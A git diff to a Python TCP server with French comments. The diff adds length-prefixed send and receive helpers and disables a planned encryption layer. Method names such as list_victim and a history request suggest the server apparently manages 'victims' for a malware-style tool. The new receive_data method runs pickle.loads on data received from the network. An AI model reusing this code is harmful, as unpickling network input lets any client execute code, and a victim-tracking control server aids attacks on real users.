@@ -30,21 +30,31 @@ print_lock = threading.Lock()
 
 class server_tcp(object):
 
+
     def __init__(self, ip, port):
         """ Création des paramètres pour le serveur afin de pouvoir initialiser la connexion
         """
         self.ip = ip
         self.port = port
 
-    def create_header(self, c, HEADER_SIZE, message):
+    def send_data(self, c, message, HEADERSIZE=10):
         """
         Créer un header pour la connexion TCP afin de savoir de où à où lire
         """
-        message_bytes = message
-        message_length = len(message_bytes)
-        header = pickle.dumps(f'{message_length:<{HEADER_SIZE}}')  # en-tête de 10 bytes
-        c.sendall(header)
-        c.sendall(message_bytes)
+        serialized_payload = pickle.dumps(message)
+        c.sendall(bytes(f"{len(serialized_payload):<{HEADERSIZE}}", 'utf-8'))
+        c.sendall(serialized_payload)
+
+    def receive_data(self, c, HEADERSIZE=10):
+        data_size = int(c.recv(HEADERSIZE)[0:HEADERSIZE])
+        received_payload = b""
+        reamining_payload_size = data_size
+        while reamining_payload_size != 0:
+            received_payload += c.recv(reamining_payload_size)
+            reamining_payload_size = data_size - len(received_payload)
+        payload = pickle.loads(received_payload)
+        return payload
+
 
     def start_server(self):
         """
@@ -84,7 +94,7 @@ class server_tcp(object):
             # De sécurité...
             # On envoie la liste
             return udata.list_victim()
-        elif "HIST_REQ" in pickle.loads(msg):
+        elif "HIST_REQ" in msg:
             # On demande un ID en particulier pour une recherche d'historique
             # On envoie l'historique
             return udata.history_req(msg[-3:-2])
@@ -104,25 +114,24 @@ class server_tcp(object):
         # Sécurisé de manière différente (différents nonce, key, authtag)
         # chaques connexion pour éviter de pouvoir spoof sur une autre connexion
         # tcp avec des keys d'autres connexions...
-        sec = security.SecurityLayer()
-        print(str(binascii.hexlify(sec.showValues()), 'utf-8'))
-        c.send(bytes(str(binascii.hexlify(sec.showValues())), 'utf-8'))
+        self.send_data(c, 'Todo')
+        #c.send(bytes(str(binascii.hexlify(sec.showValues())), 'utf-8'))
         # Todo: Mettre en place le cryptage
         while True:
-            data = c.recv(2048)
+            data = self.receive_data(c)
             if not data:
                 print(sc[0] + ':' + str(sc[1]) + ' >> connexion closed.')
                 # Suppression du thread + Reset connexion TCP --> Suppression Thread = Force close de la connexion
                 print_lock.release()
                 break
             # On print l'ip de la connexion et sa demande
-            print(str(sc[0] + ':' + str(sc[1]) + " >> " + pickle.loads(data)))
+            print(str(sc[0] + ':' + str(sc[1]) + " >> " + str(data)))
             # On construit une réponse grâce à la méthode gestion message
             rs = self.gestion_msg(c, data)
             # @Todo: Build header & send it before msg
-            r = sec.encrypt(pickle.dumps(rs))
+            #r = sec.encrypt(pickle.dumps(rs))
             # On l'envoie
-            self.create_header(c, len(r), r)
+            self.send_data(c, rs)
         # On ferme la connexion du client lors de la fin de connexion
         c.close()
 
